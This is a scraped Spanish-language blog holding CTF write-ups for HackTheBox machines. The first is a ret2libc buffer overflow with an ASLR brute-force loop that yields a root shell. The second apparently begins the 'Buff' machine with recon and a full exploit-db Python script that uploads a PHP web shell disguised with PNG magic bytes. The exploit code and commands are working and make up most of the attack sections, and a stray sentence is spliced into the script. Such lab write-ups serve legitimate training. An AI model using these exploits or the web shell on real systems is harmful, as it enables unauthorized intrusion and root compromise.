pasando desde ghidra\nFunciÃ³n main\nundefined4 main(int param_1,undefined4 *param_2) { char local_74 [112]; if (param_1 \u0026lt; 2) { printf(\u0026#34;Syntax: %s \u0026lt;input string\u0026gt;\\n\u0026#34;,*param_2); /* WARNING: Subroutine does not return */ exit(0); } strcpy(local_74,(char *)param_2[1]); return 0; } 1- Primero se declara una variable con un tamaÃ±o de buffer de 112\n2- Se comprueba si hemos proporcionado un parÃ¡metro.\n3- Se hace uso de la funciÃ³n strcpy para guardar nuestro input en la variable previamente declarada.\nstrcpy es una funciÃ³n que no es recomendable usar porque si el input es mÃ¡s grande del esperado provoca un desbordamiento del buffer, como en este caso:\n\u0026gt; ./ovrflw $(python2 -c \u0026#34;print \u0026#39;A\u0026#39;*200\u0026#34;) zsh: segmentation fault ./ovrflw $(python2 -c \u0026#34;print \u0026#39;A\u0026#39;*200\u0026#34;) Vemos el error segmentation fault asÃ­ que podemos probar de llevar a cabo un buffer overflow\nVamos a comprobar las protecciones del binario para pensar como podrÃ­amos explotarlo\n\u0026gt; checksec ./ovrflw [*] \u0026#39;/home/d3b0o/Downloads/ovrflw\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Tiene la protecciÃ³n NX activada por lo que no podemos hacer un Buffer Overflow y cargar shellcode en el stack porque no se va a ejecutar, pero lo que si podemos hacer es un Buffer Overflow ret2libc.\nLo primero es encontrar el offset para llegar al EIP (La cantidad de caracteres que necesitamos poner para llegar a sobreescribir el EIP).\nPara ello usaremos gdb con el plugin pwndbg.\nCreamos una cadena de texto de 500 caracteres\nmsf-pattern_create -l 500 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq Esta cadena de texto estÃ¡ especialmente diseÃ±ada para esto\nSe lo mandamos a pwndbg\npwndbg\u0026gt; r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq Starting program: /home/d3b0o/Downloads/ovrflw Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq [Thread debugging using libthread_db enabled] Using host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;. Program received signal SIGSEGV, Segmentation fault. 0x64413764 in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS / show-flags off / show-compact-regs off ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ EAX 0x0 *EBX 0xf7e1dff4 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x21dd8c *ECX 0xffffd290 â—‚â€” \u0026#39;Aq2Aq3Aq4Aq5Aq\u0026#39; *EDX 0xffffcf62 â—‚â€” \u0026#39;Aq2Aq3Aq4Aq5Aq\u0026#39; *EDI 0xf7ffcba0 (_rtld_global_ro) â—‚â€” 0x0 *ESI 0x80484d0 (__libc_csu_init) â—‚â€” push ebp *EBP 0x41366441 (\u0026#39;Ad6A\u0026#39;) *ESP 0xffffcdf0 â—‚â€” 0x39644138 (\u0026#39;8Ad9\u0026#39;) *EIP 0x64413764 (\u0026#39;d7Ad\u0026#39;) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / i386 / set emulate on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Invalid address 0x64413764 El programa obviamente crashea, ya que hemos sobreescrito el EIP con una direcciÃ³n que no existe y el programa no puede continuar.\nCon el siguiente comando nos calcula automÃ¡ticamente el offset del EIP\n\u0026gt; msf-pattern_offset -l 500 -q 0x64413764 [*] Exact match at offset 112 Para comprobar que realmente es 112 vamos a mandar 112 \u0026lsquo;A\u0026rsquo; acompaÃ±adas de 4 \u0026lsquo;B\u0026rsquo; si todo ha funcionado el EIP deberÃ­a valer 42424242, ya que B en hexadecimal es 42\npwndbg\u0026gt; r $(python2 -c \u0026#34;print \u0026#39;A\u0026#39; * 112 + \u0026#39;B\u0026#39; * 4\u0026#34;) Starting program: /home/d3b0o/Downloads/ovrflw $(python2 -c \u0026#34;print \u0026#39;A\u0026#39; * 112 + \u0026#39;B\u0026#39; * 4\u0026#34;) [Thread debugging using libthread_db enabled] Using host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;. Program received signal SIGSEGV, Segmentation fault. 0x42424242 in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS / show-flags off / show-compact-regs off ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ EAX 0x0 *EBX 0xf7e1dff4 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x21dd8c *ECX 0xffffd290 â—‚â€” \u0026#39;AAAAAAAAAABBBB\u0026#39; *EDX 0xffffcf62 â—‚â€” \u0026#39;AAAAAAAAAABBBB\u0026#39; *EDI 0xf7ffcba0 (_rtld_global_ro) â—‚â€” 0x0 *ESI 0x80484d0 (__libc_csu_init) â—‚â€” push ebp *EBP 0x41414141 (\u0026#39;AAAA\u0026#39;) *ESP 0xffffcf70 â—‚â€” 0x0 *EIP 0x42424242 (\u0026#39;BBBB\u0026#39;) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / i386 / set emulate on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Invalid address 0x42424242 Efectivamente funciona.\nEl siguiente paso para explotar el ret2libc es comprobar si el ASLR estÃ¡ activado.\nASLR: AleatorizaciÃ³n de las direcciones de la memoria. Esta protecciÃ³n no es del programa en sÃ­, es una protecciÃ³n del sistema. En los sistemas actuales suele ser raro encontrarlo deshabilitado. Para ver si estÃ¡ habilitado le hacemos un cat al /proc/sys/kernel/randomize_va_space. Si el contenido es un 0, es que estÃ¡ deshabilitado, si no devuelve un 0 es que estÃ¡ habilitado\nwww-data@october:/usr/local/bin$ cat /proc/sys/kernel/randomize_va_space 2 En este caso estÃ¡ habilitado, otra forma de comprobarlo serÃ­a viendo varias veces con un bucle la direcciÃ³n del libc .\nwww-data@october:/usr/local/bin$ for i in `seq 0 20`; do ldd ovrflw | grep libc; done libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb7589000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb75a5000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb75bb000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb75d0000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb75bf000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb75b0000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb761c000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb755d000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb75d1000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb7574000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb756e000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb759f000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb75fb000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb7595000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb755a000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb7548000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb7621000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb759b000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb75c8000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb757a000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb7582000) Podemos observar que va cambiando\nEsto nos dificultarÃ¡ un poco la explotaciÃ³n.\nEl siguiente paso es encontrar las direcciones de system, /bin/sh y de forma opcional exit, lo que vamos a hacer es llamar a la funciÃ³n system y como parÃ¡metros le pasaremos /bin/sh para tener una sh ejecutada por root\n(Desde la mÃ¡quina vÃ­ctima)\n/bin/sh strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep \u0026#34;/bin/sh\u0026#34; 162bac /bin/sh system y exit readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e \u0026#34; system@\u0026#34; -e \u0026#34; exit@\u0026#34; 139: 00033260 45 FUNC GLOBAL DEFAULT 12 exit@@GLIBC_2.0 1443: 00040310 56 FUNC WEAK DEFAULT 12 system@@GLIBC_2.0 TambiÃ©n pillaremos una direcciÃ³n de libc como esta, porejemplo 0xb75f5000\nCalculamos las direcciones:\nlibc = 0xb75f5000 #SYSTEM system = hex(libc + 0x40310) #EXIT exit = hex(libc + 0x33260) #/bin/sh sh = hex(libc + 0x162bac) print(system, exit, sh) \u0026gt; python3 bof.py 0xb7635310 0xb7628260 0xb7757bac Ya tenemos las 3 direcciones, pero necesitamos pasarlas a little endian\nSystem: 0xb7635310 -\u0026gt; \\x10\\x53\\x63\\xb7 Exit: 0xb7628260 -\u0026gt; \\x60\\x82\\x62\\xb7 /bin/sh: 0xb7757bac -\u0026gt; \\xac\\x7b\\x75\\xb7 El payload final quedarÃ­a de la siguiente forma\n./ovrflw $(python2 -c \u0026#34;b\u0026#39;A\u0026#39; * 112 + b\u0026#39;\\x10\\x53\\x63\\xb7\u0026#39; + b\u0026#39;\\x60\\x82\\x62\\xb7\u0026#39; + b\u0026#39;\\xac\\x7b\\x75\\xb7\u0026#39;\u0026#34;) La idea estÃ¡ bien, pero esto no funcionaria porque no estamos teniendo en cuenta el ASLR, ya que estamos suponiendo que la direcciÃ³n de libc es 0xb75f5000\nLo que podrÃ­amos hacer es ejecutar con un bucle inifinito el script, porque en algÃºn momento la librerÃ­a libc volverÃ¡ a tener la direcciÃ³n 0xb75f5000\nwhile true; do /usr/local/bin/ovrflw $(python -c \u0026#39;print b\u0026#34;A\u0026#34;*112 + \u0026#34;\\x10\\x53\\x63\\xb7\u0026#34; + \u0026#34;\\x60\\x82\\x62\\xb7\u0026#34; + \u0026#34;\\xac\\x7b\\x75\\xb7\u0026#34;\u0026#39;); done Segmentation fault (core dumped) Segmentation fault (core dumped) Segmentation fault (core dumped) Segmentation fault (core dumped) # whoami root Alcabo de un rato, somos root\n","date":"2024-03-27","id":27,"permalink":"/writeups/hackthebox/october/","summary":"En esta mÃ¡quina explotaremos un OctoberCMS con unas credenciales por defecto y una subida de archivos saltÃ¡ndonos una validaciÃ³n por extensiÃ³n. En la escalada llevaremos a cabo un Buffer Overflow con una tÃ©cnica llamada ret2libc con el ASLR (AleatorizaciÃ³n de las direcciones de la memoria.) activado","tags":["OctoberCMS","ret2libc","ASLR bypass"],"title":"October"},{"content":"","date":"2024-03-27","id":28,"permalink":"/tags/octobercms/","summary":"","tags":[],"title":"OctoberCMS"},{"content":"","date":"2024-03-27","id":29,"permalink":"/tags/ret2libc/","summary":"","tags":[],"title":"ret2libc"},{"content":"","date":"2024-03-18","id":30,"permalink":"/tags/bof/","summary":"","tags":[],"title":"BoF"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\n\u0026gt; ping -c 1 10.10.10.198 PING 10.10.10.198 (10.10.10.198) 56(84) bytes of data. 64 bytes from 10.10.10.198: icmp_seq=1 ttl=127 time=304 ms --- 10.10.10.198 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 303.579/303.579/303.579/0.000 ms Tenemos conexiÃ³n y en este caso da un ttl (time to live) de 127, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Windows\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.198 -oG allPorts ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobaciÃ³n de sÃ­ la mÃ¡quina estÃ¡ activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\n\u0026gt; extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.10.198 5 â”‚ [*] Open ports: 8080 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts bÃ¡sicos de reconocimientos de nmap\nnmap -sCV -p8080 10.10.10.198 -Pn -oN versions Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-03 12:58 CET Nmap scan report for 10.10.10.198 Host is up (0.39s latency). PORT STATE SERVICE VERSION 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) |_http-title: mrb3n\u0026#39;s Bro Hut |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts bÃ¡sicos de reconocimiento -sV Proporciona la versiÃ³n e informaciÃ³n de los servicios que corren por los puertos Puerto 8080 Nmap ha reportado que el puerto 8080 estÃ¡ abierto con una web hecha en Apache 2.4.42.\nAl entrar vemos una web simple sobre un gimnasio, si vamos al apartado de contacto vemos el siguiente mensaje.\nMade using Gym Management Software 1.0\nIntrusiÃ³n Con una bÃºsqueda en exploit-db vemos que es vulnerable a un RCE sin necesidad de estar autenticados\n\u0026gt; searchsploit gym -------------------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------------------- --------------------------------- Gym Management System 1.0 - \u0026#39;id\u0026#39; SQL Injection | php/webapps/48936.txt Gym Management System 1.0 - Authentication Bypass | php/webapps/48940.txt Gym Management System 1.0 - Stored Cross Site Scripting | php/webapps/48941.txt Gym Management System 1.0 - Unauthenticated Remote Code Execution | php/webapps/48506.py GYM MS - GYM Management System - Cross Site Scripting (Stored) | php/webapps/51777.txt WordPress Plugin WPGYM - SQL Injection | php/webapps/42801.txt -------------------------------------------------------------------- --------------------------------- Lo copiamos al directorio actual de trabajo\n\u0026gt; searchsploit -m php/webapps/48506.py Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution URL: https://www.exploit-db.com/exploits/48506 Path: /usr/share/exploitdb/exploits/php/webapps/48506.py Codes: N/A Verified: False File Type: Python script, ASCII text executable cp: overwrite \u0026#39;/home/d3b0o/Desktop/buff/48506.py\u0026#39;? y Copied to: /home/d3b0o/Desktop/buff/48506.py Este serÃ­a el exploit:\nimport requests, sys, urllib, re from colorama import Fore, Back, Style requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) def webshell(SERVER_URL, session): try: WEB_SHELL = SERVER_URL+\u0026#39;upload/kamehameha.php\u0026#39; getdir = {\u0026#39;telepathy\u0026#39;: \u0026#39;echo %CD%\u0026#39;} r2 = session.get(WEB_SHELL, params=getdir, verify=False) status = r2.status_code if status != 200: print Style.BRIGHT+Fore.RED+\u0026#34;[!] \u0026#34;+Fore.RESET+\u0026#34;Could not connect to the webshell.\u0026#34;+Style.RESET_ALL r2.raise_for_status() print(Fore.GREEN+\u0026#39;[+] \u0026#39;+Fore.RESET+\u0026#39;Successfully connected to webshell.\u0026#39;) cwd = re.findall(\u0026#39;[CDEF].*\u0026#39;, r2.text) cwd = cwd[0]+\u0026#34;\u0026gt; \u0026#34; term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET while True: thought = raw_input(term) command = {\u0026#39;telepathy\u0026#39;: thought} r2 = requests.get(WEB_SHELL, params=command, verify=False) status = r2.status_code if status != 200: r2.raise_for_status() response2 = r2.text print(response2) except: print(\u0026#34;\\r\\nExiting.\u0026#34;) sys.exit(-1) def formatHelp(STRING): return Style.BRIGHT+Fore.RED+STRING+Fore.RESET def header(): BL = Style.BRIGHT+Fore.GREEN RS = Style.RESET_ALLomo instalar mona.py en Immunity Debugger FR = Fore.RESET SIG = BL+\u0026#39; /\\\\\\n\u0026#39;+RS SIG += Fore.YELLOW+\u0026#39;/vvvvvvvvvvvv \u0026#39;+BL+\u0026#39;\\\\\u0026#39;+FR+\u0026#39;--------------------------------------,\\n\u0026#39; SIG += Fore.YELLOW+\u0026#39;`^^^^^^^^^^^^\u0026#39;+BL+\u0026#39; /\u0026#39;+FR+\u0026#39;============\u0026#39;+Fore.RED+\u0026#39;BOKU\u0026#39;+FR+\u0026#39;=====================\u0026#34;\\n\u0026#39; SIG += BL+\u0026#39; \\/\u0026#39;+RS+\u0026#39;\\n\u0026#39; return SIG if __name__ == \u0026#34;__main__\u0026#34;: print header(); if len(sys.argv) != 2: print formatHelp(\u0026#34;(+) Usage:\\t python %s \u0026lt;WEBAPP_URL\u0026gt;\u0026#34; % sys.argv[0]) print formatHelp(\u0026#34;(+) Example:\\t python %s \u0026#39;https://10.0.0.3:443/gym/\u0026#39;\u0026#34; % sys.argv[0]) sys.exit(-1) SERVER_URL = sys.argv[1] UPLOAD_DIR = \u0026#39;upload.php?id=kamehameha\u0026#39; UPLOAD_URL = SERVER_URL + UPLOAD_DIR s = requests.Session() s.get(SERVER_URL, verify=False) PNG_magicBytes = \u0026#39;\\x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a\u0026#39; png = { \u0026#39;file\u0026#39;: ( \u0026#39;kaio-ken.php.png\u0026#39;, PNG_magicBytes+\u0026#39;\\n\u0026#39;+\u0026#39;\u0026lt;?php echo shell_exec($_GET[\u0026#34;telepathy\u0026#34;]); ?\u0026gt;\u0026#39;, \u0026#39;image/png\u0026#39;, {\u0026#39;Content-Disposition\u0026#39;: \u0026#39;form-data\u0026#39;} ) } fdata = {\u0026#39;pupload\u0026#39;: \u0026#39;upload\u0026#39;} r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False) webshell(SERVER_URL, s) BÃ¡sicamente, lo que hace es subir un archivo el cual lo llama kaio-ken.php.png en el /upload.php. Dentro del archivo le mete los magic bytes de PNG para que se piense que el contenido es un png (x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a). A continuaciÃ³n hay un ejemplo de como usar esta tÃ©cnica para hacer que un script de php se piense que es un GIF\n\u0026gt; cat test.php â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: test.php â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ \u0026lt;?php 2 â”‚ echo \u0026#34;Test\u0026#34; 3 â”‚ ?\u0026gt; â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ \u0026gt; file test.php test.php: PHP script, ASCII text \u0026gt; cat test.php â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: test.php â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ GIF8; 2 â”‚ \u0026lt;?php 3 â”‚ echo \u0026#34;Test\u0026#34; 4 â”‚ ?\u0026gt; 